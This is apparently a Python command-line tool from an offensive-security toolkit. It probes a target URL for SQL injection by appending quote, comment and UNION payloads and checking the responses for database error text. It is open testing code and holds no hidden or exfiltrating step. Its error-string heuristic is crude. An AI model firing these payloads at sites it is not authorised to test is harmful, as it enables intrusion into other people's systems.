'''
Module: sqli.py
Author: dmdhrumilmistry
Project: github.com/dmdhrumilmistry/pyhtools
License: MIT
'''
from argparse import ArgumentParser
from requests import get
from sys import exit


def is_url_valid(url: str) -> bool:
    '''checks if url is valid
    
    Args: 
        url (str): url of the target
    
    Returns:
        bool: returns True if url is valid else False
    '''
    is_valid = False
    if 'http://' in url or 'https://' in url:
        is_valid = True

    if len(url.split('?')[-1]) == 0:
        is_valid = False

    return is_valid


def is_vulnerable(url: str) -> bool:
    '''tests whether app is vulnerable to the url

    Args: 
        url (str): url of the target
    
    Returns: 
        bool: returns True if vulnerable else returns False
    '''
    response = get(url=url)
    content = response.content.lower()

    if response.status_code not in (200, 404) or b'error' in content or b'on line' in content or b'at line' in content:
        return True

    return False


def enumerate_tests(url):
    '''tests application for various SQL injection methods
    
    Args: 
        url (str): url of the target
    
    Returns: 
        None
    '''
    vuln_links = 0
    sqli_payloads = ["'", "'--",
                     "' UNION SELECT NULL--", "' UNION ORDER BY 1--"]

    for payload in sqli_payloads:
        payload_url = url + payload

        if is_vulnerable(payload_url):
            print(f'[URL] "{payload_url}"')
            print(f'[PAYLOAD] {payload}')
            print('-'*40)
            vuln_links += 1

    print(f'[VULN] {vuln_links} total vulnerable links found')


if __name__ == '__main__':
    # create argument parser
    parser = ArgumentParser()
    parser.add_argument('-u', '--url', dest='url',
                        help='URL of the target with parameter', required=True)

    # get args
    args = parser.parse_args()
    url = args.url

    # verify url
    if not is_url_valid(url):
        print('[ERROR] URL is invalid')
        print('[HINT] use `http://` or `https://` in url')
        exit()

    # test Web Application
    enumerate_tests(url)
